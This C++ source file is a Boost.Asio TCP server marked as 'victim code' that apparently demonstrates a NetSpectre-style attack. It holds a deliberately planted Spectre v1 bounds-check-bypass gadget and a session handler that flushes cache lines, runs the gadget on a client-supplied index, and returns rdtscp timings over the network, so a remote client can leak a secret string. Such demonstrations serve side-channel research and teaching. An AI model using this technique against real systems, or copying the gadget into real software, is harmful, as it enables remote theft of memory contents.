#include <boost/asio/ts/buffer.hpp>
#include <boost/asio/ts/internet.hpp>
#include <iostream>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <x86intrin.h>

using boost::asio::ip::tcp;

/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
uint8_t unused2[64];
uint8_t array2[256 * 512];

char *secret = "The Magic Words are Squeamish Ossifrage.";

int spectreResults[256];
int myResults[256];

// Classic Spectre gadget
void victim_function(size_t x) {
  if (x < array1_size) {
    asm volatile("" : : "r"(array2[array1[x] * 512]));
  }
}

class session : public std::enable_shared_from_this<session> {
public:
  session(tcp::socket socket) : socket_(std::move(socket)) {}

  void start() {
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(0, &mask);
    int status = sched_setaffinity(0, sizeof(mask), &mask);
    if (status)
      throw std::runtime_error("schedaffinity");
    do_read();
  }

private:
  void do_read() {
    auto self(shared_from_this());
    socket_.async_read_some(
        boost::asio::buffer(buffer, max_length),
        [this, self](boost::system::error_code ec, std::size_t length) {
          if (!ec) {
            do_write(length);
          }
        });
  }

  void do_write(std::size_t length) {
    auto self(shared_from_this());

    // Netspectre gadget
    uint64_t elapsed;
    if (length == sizeof(uint64_t)) {
      for (int i = 0; i < 256; i++) {
        myResults[i] = 0;
      }

      uint64_t a;
      std::memcpy(&a, buffer, sizeof(a));
      std::cout << "Reading at malicious_x = " << a << std::endl;

#pragma GCC unroll 1
      for (int i = 0; i < 256; i++) {
        _mm_clflush(&array2[i * 512]);
      }

      _mm_clflush(&array1_size);

#pragma GCC unroll 1
      for (int z = 0; z < 100; z++) {
        asm volatile("nop" : : : "memory");
      }

      victim_function(a);

#pragma GCC unroll 1
      for (int i = 0; i < 256; i++) {
        int mix_i = ((i * 167) + 13) & 255;
        uint8_t *addr = &array2[mix_i * 512];
        uint32_t time1;
        uint32_t time2;
        {
          uint32_t tmp;
          asm volatile(R"(rdtscp
mov %%eax, %0
mov (%2), %%edx
rdtscp
mov %%eax, %1)"
                       : "=&r"(time1), "=&r"(time2)
                       : "r"(addr)
                       : "eax", "edx", "ecx", "memory");
        }
        myResults[mix_i] = time2 - time1;
      }
    }

    boost::asio::async_write(
        socket_, boost::asio::buffer(&myResults, sizeof(myResults)),
        [this, self](boost::system::error_code ec, std::size_t) {
          if (!ec) {
            do_read();
          }
        });
  }

  tcp::socket socket_;
  static constexpr size_t max_length = sizeof(uint32_t) * 4;
  char buffer[max_length];
};

class server {
public:
  server(boost::asio::io_context &io_context, short port)
      : acceptor_(io_context, tcp::endpoint(tcp::v4(), port)),
        socket_(io_context) {
    do_accept();
  }

private:
  void do_accept() {
    acceptor_.async_accept(socket_, [this](boost::system::error_code ec) {
      if (!ec) {
        std::make_shared<session>(std::move(socket_))->start();
      }

      do_accept();
    });
  }

  tcp::acceptor acceptor_;
  tcp::socket socket_;
};

int main(int argc, const char **argv) {
  try {
    size_t malicious_x =
        (size_t)(secret - (char *)array1); /* default for malicious_x */
    int i, score[2], len = 40;
    std::cout << "malicious_x: " << malicious_x << std::endl;

    uint8_t value[2];

    for (i = 0; i < sizeof(array2); i++)
      array2[i] = 1;

    boost::asio::io_context io_context;

    server s(io_context, std::atoi(argv[1]));

    io_context.run();
  } catch (std::exception &e) {
    std::cerr << "Exception: " << e.what() << "\n";
  }
  return (0);
}